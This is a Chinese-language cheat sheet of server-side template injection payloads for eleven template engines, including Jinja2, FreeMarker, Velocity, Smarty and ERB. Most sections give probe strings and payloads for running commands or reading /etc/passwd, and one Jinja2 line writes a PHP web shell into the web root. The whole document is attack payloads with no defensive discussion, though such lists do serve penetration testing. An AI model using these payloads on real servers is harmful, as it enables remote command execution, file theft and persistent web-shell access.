# SSTI详细分类

## 1. Jinja2 (Python)

### 探测

```
{{7*7}}
{{config}}
{{request}}
```

### 读取文件

```
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{request.application.__class__.__globals__['__builtins__'].open('/etc/passwd').read()}}
```

### 命令执行

```
{{''.__class__.__mro__[2].__subclasses__()[40].__init__.__globals__['os'].popen('id').read()}}
{{request.__class__.__mro__[2].__subclasses__()|join(',')}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### 写文件

```
{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/shell.php','w').write('<?php system($_GET["cmd"]);?>')}}
```

---

## 2. Twig (PHP)

### 探测

```
{{7*7}}
{{_self}}
```

### 命令执行

```
{{_self.env.display.block_name}}
{{_self.env.getLoader().getTemplate('test').render()}}
{{createFunction('system','id')()}}
```

---

## 3. FreeMarker (Java)

### 探测

```
${7*7}
${1+1}
```

### 命令执行

```
${"freemarker.template.utility.Execute"?new()("id")}
${T(java.lang.Runtime).getRuntime().exec('id')}
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

### 读取文件

```
${T(java.lang.Thread).currentThread().contextClassLoader.loadClass("java.io.FileReader").getConstructor(class).newInstance(class.getMethod("getAbsolutePath").invoke(null))}
```

---

## 4. Velocity (Java)

### 探测

```
#set($x='')
${7*7}
```

### 命令执行

```
#set($rt=$x.class.forName('java.lang.Runtime'))
$rt.getRuntime().exec('id')
#set($e=$x.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript'))
$e.eval('java.lang.Runtime.getRuntime().exec("id")')
```

---

## 5. Thymeleaf (Java)

### 探测

```
${7*7}
*{7*7}
```

### 命令执行

```
${T(java.lang.Runtime).getRuntime().exec('id')}
```

---

## 6. Smarty (PHP)

### 探测

```
{php}phpinfo(){/php}
```

### 命令执行

```
{php}system('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_FILENAME,"<?php system('id');?>",self::clearCompileId())}
```

---

## 7. Mako (Python)

### 探测

```
${7*7}
<%
print(7*7)
%>
```

### 命令执行

```
${self.module.compiler.generate_python_code}
${self.module.runtime.globals['__builtins__']['__import__']('os').popen('id').read()}
```

---

## 8. Tornado (Python)

### 探测

```
{{7*7}}
{% import os %}
```

### 命令执行

```
{% import os %}
{{ os.popen('id').read() }}
```

---

## 9. Django (Python)

### 探测

```
{{7*7}}
{{request}}
{{settings.SECRET_KEY}}
```

### 命令执行

```
{{ request }}
{{ request.__class__.__mro__[2].__subclasses__() }}
```

---

## 10. ERB (Ruby)

### 探测

```
<%= 7*7 %>
```

### 命令执行

```
<%= system('id') %>
<%= `id` %>
<%= File.read('/etc/passwd') %>
<%= IO.popen('id').read() %>
```

---

## 11. Pug/Jade

### 探测

```
= 7*7
- 7*7
```

### 命令执行

```
- var x = process.mainModule.require('child_process').execSync('id')
= x
```
